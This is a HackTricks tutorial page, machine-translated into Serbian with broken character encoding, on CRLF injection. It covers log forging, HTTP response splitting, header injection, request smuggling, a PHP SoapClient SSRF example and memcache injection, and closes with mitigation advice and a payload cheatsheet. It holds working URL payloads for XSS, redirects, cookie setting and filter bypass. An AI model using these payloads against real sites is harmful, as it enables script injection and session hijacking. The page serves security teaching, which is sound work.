# CRLF (%0D%0A) Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### CRLF

Carriage Return (CR) i Line Feed (LF), zajedno poznati kao CRLF, su posebne sekvence karaktera koje se koriste u HTTP protokolu za oznaÄavanje kraja reda ili poÄetka novog. Web serveri i pregledaÄi koriste CRLF da razlikuju izmeÄ‘u HTTP zaglavlja i tela odgovora. Ovi karakteri se univerzalno koriste u HTTP/1.1 komunikacijama Å¡irom razliÄitih tipova web servera, kao Å¡to su Apache i Microsoft IIS.

### CRLF Injection Vulnerability

CRLF injekcija ukljuÄuje umetanje CR i LF karaktera u korisniÄki uneti podatak. Ova akcija dovodi server, aplikaciju ili korisnika u zabludu da interpretira umetnutu sekvencu kao kraj jednog odgovora i poÄetak drugog. Iako ovi karakteri nisu inherentno Å¡tetni, njihovo zloupotrebljavanje moÅ¾e dovesti do deljenja HTTP odgovora i drugih zlonamernih aktivnosti.

### Example: CRLF Injection in a Log File

[Example from here](https://www.invicti.com/blog/web-security/crlf-http-header/)

Razmotrite log fajl u admin panelu koji prati format: `IP - Vreme - Posetena Staza`. TipiÄan unos moÅ¾e izgledati kao:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
NapadaÄ moÅ¾e iskoristiti CRLF injekciju da manipuliÅ¡e ovim logom. Umetanjem CRLF karaktera u HTTP zahtev, napadaÄ moÅ¾e promeniti izlazni tok i fabricirati log unose. Na primer, umetnuta sekvenca moÅ¾e transformisati log unos u:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Ovde, `%0d` i `%0a` predstavljaju URL-enkodirane forme CR i LF. Nakon napada, log bi obmanjujuÄ‡e prikazivao:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
NapadaÄ tako prikriva svoje zlonamerne aktivnosti tako Å¡to izgleda kao da je localhost (entitet koji se obiÄno smatra pouzdanim unutar serverskog okruÅ¾enja) izvrÅ¡io radnje. Server interpretira deo upita koji poÄinje sa `%0d%0a` kao jedan parametar, dok se parametar `restrictedaction` analizira kao drugi, odvojen unos. Manipulisani upit efikasno oponaÅ¡a legitimnu administrativnu komandu: `/index.php?page=home&restrictedaction=edit`

### HTTP Response Splitting

#### Opis

HTTP Response Splitting je sigurnosna ranjivost koja nastaje kada napadaÄ iskoristi strukturu HTTP odgovora. Ova struktura razdvaja zaglavlja od tela koristeÄ‡i specifiÄnu sekvencu karaktera, Carriage Return (CR) praÄ‡enu Line Feed (LF), koja se zajedno naziva CRLF. Ako napadaÄ uspe da umetne CRLF sekvencu u zaglavlje odgovora, moÅ¾e efikasno manipulisati sadrÅ¾ajem narednog odgovora. Ova vrsta manipulacije moÅ¾e dovesti do ozbiljnih sigurnosnih problema, posebno Cross-site Scripting (XSS).

#### XSS kroz HTTP Response Splitting

1. Aplikacija postavlja prilagoÄ‘eno zaglavlje ovako: `X-Custom-Header: UserInput`
2. Aplikacija preuzima vrednost za `UserInput` iz parametra upita, recimo "user\_input". U scenarijima koji nemaju pravilnu validaciju i kodiranje unosa, napadaÄ moÅ¾e kreirati payload koji ukljuÄuje CRLF sekvencu, praÄ‡enu zlonamernim sadrÅ¾ajem.
3. NapadaÄ kreira URL sa posebno kreiranim 'user\_input': `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
* U ovom URL-u, `%0d%0a%0d%0a` je URL-enkodirani oblik CRLFCRLF. Prevari server da umetne CRLF sekvencu, ÄineÄ‡i da server tretira naredni deo kao telo odgovora.
4. Server odraÅ¾ava napadaÄev unos u zaglavlju odgovora, Å¡to dovodi do nenamernog strukturalnog odgovora gde zlonamerni skript interpretira pregledaÄ kao deo tela odgovora.

#### Primer HTTP Response Splitting koji dovodi do preusmeravanja

Sa [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

PregledaÄ na:
```
/%0d%0aLocation:%20http://myweb.com
```
I server odgovara sa zaglavljem:
```
Location: http://myweb.com
```
**Drugi primer: (sa** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### U URL Putanji

MoÅ¾ete poslati payload **unutar URL putanje** da kontroliÅ¡ete **odgovor** sa servera (primer iz [ovde](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Check more examples in:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### HTTP Header Injection

HTTP Header Injection, Äesto iskoriÅ¡Ä‡en kroz CRLF (Carriage Return and Line Feed) injekciju, omoguÄ‡ava napadaÄima da umetnu HTTP zaglavlja. Ovo moÅ¾e oslabiti bezbednosne mehanizme kao Å¡to su XSS (Cross-Site Scripting) filteri ili SOP (Same-Origin Policy), potencijalno dovodeÄ‡i do neovlaÅ¡Ä‡enog pristupa osetljivim podacima, kao Å¡to su CSRF tokeni, ili manipulacije korisniÄkim sesijama kroz postavljanje kolaÄiÄ‡a.

#### Exploiting CORS via HTTP Header Injection

NapadaÄ moÅ¾e umetnuti HTTP zaglavlja kako bi omoguÄ‡io CORS (Cross-Origin Resource Sharing), zaobilazeÄ‡i ograniÄenja koja postavlja SOP. Ova povreda omoguÄ‡ava skriptama iz zlonamernih izvora da komuniciraju sa resursima iz drugog izvora, potencijalno pristupajuÄ‡i zaÅ¡tiÄ‡enim podacima.

#### SSRF and HTTP Request Injection via CRLF

CRLF injekcija se moÅ¾e iskoristiti za kreiranje i umetanje potpuno novog HTTP zahteva. ZnaÄajan primer ovoga je ranjivost u PHP-ovoj `SoapClient` klasi, posebno unutar `user_agent` parametra. Manipulacijom ovog parametra, napadaÄ moÅ¾e umetnuti dodatna zaglavlja i sadrÅ¾aj tela, ili Äak potpuno injektovati novi HTTP zahtev. Ispod je PHP primer koji demonstrira ovu eksploataciju:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Header Injection to Request Smuggling

Za viÅ¡e informacija o ovoj tehnici i potencijalnim problemima [**proverite izvor**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

MoÅ¾ete ubrizgati bitne zaglavlja kako biste osigurali da **pozadinski sistem zadrÅ¾i vezu otvorenom** nakon odgovora na inicijalni zahtev:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Nakon toga, moÅ¾e se odrediti drugi zahtev. Ovaj scenario obiÄno ukljuÄuje [HTTP request smuggling](http-request-smuggling/), tehniku gde dodatni zaglavlja ili elementi tela koje server dodaje nakon injekcije mogu dovesti do raznih sigurnosnih eksploatacija.

**Eksploatacija:**

1. **Injekcija zlonamernog prefiksa**: Ova metoda ukljuÄuje trovanje zahteva sledeÄ‡eg korisnika ili web keÅ¡a specificiranjem zlonamernog prefiksa. Primer ovoga je:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **Kreiranje prefiksa za trovanje reda odgovora**: Ovaj pristup ukljuÄuje kreiranje prefiksa koji, kada se kombinuje sa dodatnim smeÄ‡em, formira kompletan drugi zahtev. Ovo moÅ¾e izazvati trovanje reda odgovora. Primer je:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Memcache Injekcija

Memcache je **key-value store koji koristi protokol u Äistom tekstu**. ViÅ¡e informacija u:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**Za sve informacije proÄitajte**[ **originalni izveÅ¡taj**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

Ako platforma uzima **podatke iz HTTP zahteva i koristi ih bez sanitizacije** za obavljanje **zahteva** ka **memcache** serveru, napadaÄ bi mogao da zloupotrebi ovo ponaÅ¡anje da **ubaci nove memcache komande**.

Na primer, u prvobitno otkrivenoj ranjivosti, keÅ¡ kljuÄevi su koriÅ¡Ä‡eni da vrate IP i port na koji bi korisnik trebao da se poveÅ¾e, a napadaÄi su mogli da **ubace memcache komande** koje bi **otrovale** **keÅ¡ da poÅ¡alje detalje Å¾rtava** (korisniÄka imena i lozinke ukljuÄena) na servere napadaÄa:

<figure><img src="../.gitbook/assets/image (659).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

Pored toga, istraÅ¾ivaÄi su takoÄ‘e otkrili da mogu da desinkronizuju memcache odgovore kako bi poslali IP i portove napadaÄa korisnicima Äiji email napadaÄ nije znao:

<figure><img src="../.gitbook/assets/image (637).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### Kako spreÄiti CRLF / HTTP zaglavlja injekcije u web aplikacijama

Da bi se umanjili rizici od CRLF (Carriage Return and Line Feed) ili HTTP zaglavlja injekcija u web aplikacijama, preporuÄuju se sledeÄ‡e strategije:

1. **Izbegavajte direktan unos korisnika u zaglavljima odgovora:** Najsigurniji pristup je da se uzdrÅ¾ite od ukljuÄivanja unosa koji je obezbedio korisnik direktno u zaglavlja odgovora.
2. **Kodirajte specijalne karaktere:** Ako izbegavanje direktnog unosa korisnika nije izvodljivo, obavezno koristite funkciju posveÄ‡enu kodiranju specijalnih karaktera kao Å¡to su CR (Carriage Return) i LF (Line Feed). Ova praksa spreÄava moguÄ‡nost CRLF injekcije.
3. **AÅ¾urirajte programski jezik:** Redovno aÅ¾urirajte programski jezik koji se koristi u vaÅ¡im web aplikacijama na najnoviju verziju. Odaberite verziju koja inherentno zabranjuje injekciju CR i LF karaktera unutar funkcija koje su zaduÅ¾ene za postavljanje HTTP zaglavlja.

### CHEATSHEET

[Cheatsheet odavde](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
â€¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
â€¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
â€¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
â€¢ /google.com/%2F..%0D%0AHeader-Test:test2
â€¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
â€¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
â€¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
â€¢ %E5%98%8A = %0A = \u560a
â€¢ %E5%98%8D = %0D = \u560d
â€¢ %E5%98%BE = %3E = \u563e (>)
â€¢ %E5%98%BC = %3C = \u563c (<)
â€¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Automatski alati

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Lista za detekciju Brute-Force

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## Reference

* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty savet**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
